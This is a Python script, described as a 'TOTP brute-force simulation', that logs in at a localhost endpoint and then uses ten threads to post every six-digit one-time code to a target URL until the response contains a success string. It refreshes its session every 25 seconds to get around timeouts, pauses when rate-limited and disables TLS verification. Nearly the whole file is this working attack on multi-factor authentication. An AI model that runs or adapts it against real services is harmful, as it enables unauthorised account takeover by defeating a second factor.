import argparse
import time
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

import urllib3
from datetime import datetime, timezone

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.exit("Please install requests")

try:
    import pyotp
    PYOTP_AVAILABLE = True
except ImportError:
    PYOTP_AVAILABLE = False


def make_session(proxy = None):
    """
    Initializes requests. Session object with automated retry
    Retries for common server errors like 500, 502 and 503 and routes traffic through the chosen HTTP/HTTPS proxy.
    Args:
        proxy (str): proxy url
    Returns:
        requests.Session: session object

    """
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=0.2, status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    return session

def set_auth(session, token, cookie, header_name):
    """
    Applies auth credentials to a session object.
    Attaches a token to a specified cookie or HTTP Auth header.
    Args:
        session (requests.Session): session object
        cookie (str): cookie name
        header_name (str): header name
        token(str): auth token/secret
    """
    if token:
        if cookie:
            session.cookies.set(cookie, token)
        elif header_name:
            session.headers["AUTHORIZATION"] = f"Bearer {token}"
        else:
            session.headers["AUTHORIZATION"] = f"Bearer {token}"


def get_fresh_session(base_url, username, password):
    s = make_session()
    s.verify = False
    s.post(f"{base_url}/auth/mfa-login", data={"username": username, "password": password}, allow_redirects=True)
    return s

def enumerate_codes(base_url, username, password, url, field_code, success, verbose, start=0, end=999999):
    found = [None]
    attempt_count = [0]
    lock = Lock()
    session_holder = [get_fresh_session(base_url, username, password)]
    last_refresh = [time.time()]

    def try_single(code_int):
        if found[0]:
            return None

        # refresh session every 25 seconds
        with lock:
            if time.time() - last_refresh[0] > 25:
                session_holder[0] = get_fresh_session(base_url, username, password)
                last_refresh[0] = time.time()
                print("\n[*] Session refreshed")

        code = f"{code_int:06d}"
        result = _try_code(session_holder[0], url, code, field_code, success, verbose)
        with lock:
            attempt_count[0] += 1
        if result == "success":
            found[0] = code
            print(f"\n[!!!] TOTP accepted: {code}")
        elif result == "ratelimited":
            time.sleep(30)
        return result

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(try_single, i): i for i in range(start, end + 1)}
        for future in as_completed(futures):
            if found[0]:
                executor.shutdown(wait=False, cancel_futures=True)
                break

    elapsed = time.time() - start_time
    stats = {
        "attempts_made": attempt_count[0],
        "time_seconds": round(elapsed, 2),
        "time_human": f"{int(elapsed // 60)}m {int(elapsed % 60)}s",
        "codes_per_second": round(attempt_count[0] / elapsed, 2) if elapsed > 0 else 0,
        "percentage_searched": round((attempt_count[0] / (end - start + 1)) * 100, 4)
    }
    print(f"\n[*] Attempts: {stats['attempts_made']} | Time: {stats['time_human']} | Speed: {stats['codes_per_second']} req/s")

    return found[0], stats

def _try_code(session, url, code, field_code, success, verbose):
    """
    HTTP POST request to test specific code
    Evaluate server HTTP status code and response body
    Args:
        session (requests.Session): session object
        url (str): target url
        code (str): zero padded 6 digit code being tested
        field_code (str): key name expected for submission payload
        success (bool): success flag
        verbose (bool): if true, prints status indicators to stdout
    Returns:
        str: status outcome identifier string(success, ratelimited, locked, failed)
    """
    payload = {field_code: code}

    try:
        response = session.post(url, data=payload, timeout=10, allow_redirects=True, verify=False)
        body = response.text.lower()
        success_lower = success.lower()

        if verbose:
            mark = "yes" if success_lower in body else "no"
            print(f"  [{mark}] {code} → HTTP {response.status_code}")
        if response.status_code == 429:
            return "ratelimited"
        if response.status_code in (423, 403) and "locked" in body:
            return "locked"
        if success_lower in body:
            return "success"

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
    return "fail"

def save_report(data, path="totp_results.json"):
    """
    Saves report as JSON
    Args:
        data (dict): report data containing fidings and statistics
        path (str): path to save report to
    """
    data["generated"] = datetime.now(timezone.utc).isoformat()
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print("Report saved to totp_results.json")


def main():
    parser = argparse.ArgumentParser(description="TOTP brute-force simulation")
    parser.add_argument("--url",          required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--mode",         required=True, choices=["enumerate"])
    parser.add_argument("--session-token", default=None)
    parser.add_argument("--cookie-name",  default=None)
    parser.add_argument("--header-name",  default=None)
    parser.add_argument("--field-code",   default="token")
    parser.add_argument("--success",      default="questionnaire")
    parser.add_argument("--verbose",      action="store_true")
    parser.add_argument("--output",       default="totp_results.json")
    parser.add_argument("--start",        type=int, default=0)
    parser.add_argument("--end",          type=int, default=999999)
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    s = make_session()
    set_auth(s, args.session_token, args.cookie_name, args.header_name)

    result_data = {"mode": args.mode, "url": args.url, "findings": []}

    if args.mode == "enumerate":
        code, stats = enumerate_codes(
            "https://127.0.0.1:5001",
            args.username, args.password,
            args.url, args.field_code, args.success,
            args.verbose, args.start, args.end
        )

        result_data["stats"] = stats
        if code:
            result_data["findings"].append({"type": "enumeration_success", "code": code})


    save_report(result_data, args.output)

if __name__ == "__main__":
    main()

